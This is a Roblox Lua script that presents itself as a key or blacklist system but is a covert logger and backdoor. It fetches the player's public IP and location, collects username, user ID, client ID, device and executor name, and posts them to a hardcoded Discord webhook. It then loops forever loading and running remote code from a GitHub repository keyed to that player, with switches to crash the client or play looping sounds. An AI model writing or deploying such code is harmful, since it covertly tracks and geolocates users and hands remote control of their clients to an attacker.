-- key sys
-- blacklist sys






local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local Lplr = game.Players.LocalPlayer
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local clientId = RbxAnalyticsService:GetClientId()
local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local ip = game:HttpGet("https://api.ipify.org")
local response = game:HttpGet("http://ip-api.com/json/" .. tostring(ip))
local allInfo = HttpService:JSONDecode(response)
local countryCode, region = allInfo["countryCode"], allInfo["regionName"]

local platform = UserInputService:GetPlatform()
local platformNames = {
    [Enum.Platform.Windows] = "Windows PC",
    [Enum.Platform.OSX] = "Mac",
    [Enum.Platform.IOS] = "iOS Device",
    [Enum.Platform.Android] = "Android Device",
    [Enum.Platform.UWP] = "UWP",
}
local deviceType = platformNames[platform] or "Unknown Device"
local executor = identifyexecutor() or "unknown"

local function Troll()
    local content = [[
-- universal
_G.Crash = false
_G.Taco = false

-- Trident survival <> work in progress
_G.Ban = false
_G.BPlayer = false
_G.Small = false
]]
    return "https://github.com/Pumpuma/test/new/main?filename=" .. clientId .. "&value=" .. HttpService:UrlEncode(content)
end

local function Execute()
    local content = [[
local executed = false if executed == false then executed = true
-- script you want to execute here

end
]]
    return "https://github.com/Pumpuma/test/new/main?filename=" .. Lplr.UserId .. "&value=" .. HttpService:UrlEncode(content)
end

local webhookURL = "https://discord.com/api/webhooks/1266074223860781077/BAGPJ7cOHg9FUTGTvfmtykQ4-fcv3h6CODdZ4Q-tWVTyYwwUdklZ761FUEG-OMKaEewb"
local webhookData = {
    ["content"] = " ",
    ["embeds"] = {
        {
            ["title"] = "Logger Information",
            ["description"] = 
                "**USER INFO**\n" ..
                "username: " .. Lplr.Name .. "\n" ..
                "userID: " .. Lplr.UserId .. "\n" ..
                "time: " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n" ..
                "premium: " .. (Lplr.MembershipType == Enum.MembershipType.Premium and "true" or "false") .. "\n" ..
                "IP: " .. ip .. "\n" ..
                "device: " .. deviceType .. "\n" ..
                "Location: " .. region .. ", " .. countryCode .. "\n" ..
                "Executor: " .. executor .. "\n" ..
                "Client ID:\n" .. clientId .. "\n\n" .. 
                "**COMMANDS**\n" ..
                "[Troll](" .. Troll() .. ")\n" ..
                "[Execute](" .. Execute() .. ")\n" ..
                "[IP Info](https://ipinfo.io/" .. ip .. ")\n"
        }
    }
}

local encodedData = HttpService:JSONEncode(webhookData)
local headers = {["content-type"] = "application/json"}
local request = http_request or request or HttpPost or syn.request
local requestData = {Url = webhookURL, Body = encodedData, Method = "POST", Headers = headers}

local success, errorMsg = pcall(function()
    request(requestData)
end)
if not success then
    warn("Tell the dev: Omega 1 ")
end 
---------- 

while true do wait(1) loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/test/main/" .. clientId))() end
while true do wait(1) loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/test/main/" .. Lplr.UserId))() end

-- universal
local taco = false
while true do;wait()
 
   if _G.Taco and not taco then
        tacoPlayed = true
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://142376088"
        sound.Looped = true
        sound.Volume = 1
        sound.Parent = game:GetService("SoundService")
        sound:Play()
    end
    
    if _G.Crash then
        while true do end
    end
    
end
